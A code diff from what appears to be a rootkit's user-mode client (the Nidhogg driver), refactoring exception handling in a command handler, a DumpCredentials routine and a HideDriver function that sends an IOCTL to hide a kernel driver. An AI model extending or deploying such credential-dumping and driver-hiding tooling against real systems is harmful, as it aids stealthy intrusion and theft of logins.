@@ -93,7 +93,7 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 		try {
 			modulePath = ParsePath<std::string, std::wstring>(params.at(1));
 		}
-		catch (const HelperException& e) {
+		catch (const PathHelperException& e) {
 			std::cerr << e.what() << std::endl;
 			return;
 		}
@@ -110,7 +110,7 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 		try {
 			driverPath = ParsePath<std::string, std::wstring>(params.at(1));
 		}
-		catch (const HelperException& e) {
+		catch (const PathHelperException& e) {
 			std::cerr << e.what() << std::endl;
 			return;
 		}
@@ -127,7 +127,7 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 		try {
 			driverPath = ParsePath<std::string, std::wstring>(params.at(1));
 		}
-		catch (const HelperException& e) {
+		catch (const PathHelperException& e) {
 			std::cerr << e.what() << std::endl;
 			return;
 		}
@@ -356,7 +356,7 @@ std::vector<Credentials> MemoryHandler::DumpCredentials(_Inout_ std::shared_ptr<
 	try {
 		desKey->Data = SafeAlloc<PVOID>(desKey->Size);
 	}
-	catch (const HelperException& e) {
+	catch (const SafeMemoryException& e) {
 		throw MemoryHandlerException(e.what());
 	}
 
@@ -450,12 +450,19 @@ std::vector<Credentials> MemoryHandler::DumpCredentials(_Inout_ std::shared_ptr<
  */
 bool MemoryHandler::HideDriver(_In_ std::wstring driverPath, _In_ bool hide) {
 	DWORD returned = 0;
+	std::wstring parsedDriverName = L"";
 	HiddenDriverInformation driverInfo{};
 
 	if (!IsValidPath(driverPath))
 		return false;
 
-	std::wstring parsedDriverName = ParsePath<std::wstring, std::wstring>(driverPath);
+	try {
+		parsedDriverName = ParsePath<std::wstring, std::wstring>(driverPath);
+	}
+	catch (const PathHelperException& e) {
+		std::cerr << e.what() << std::endl;
+		return false;
+	}
 	driverInfo.DriverName = parsedDriverName.data();
 	driverInfo.Hide = hide;
 	return DeviceIoControl(hNidhogg.get(), IOCTL_HIDE_UNHIDE_DRIVER, &driverInfo, sizeof(driverInfo), nullptr, 0, &returned, nullptr);
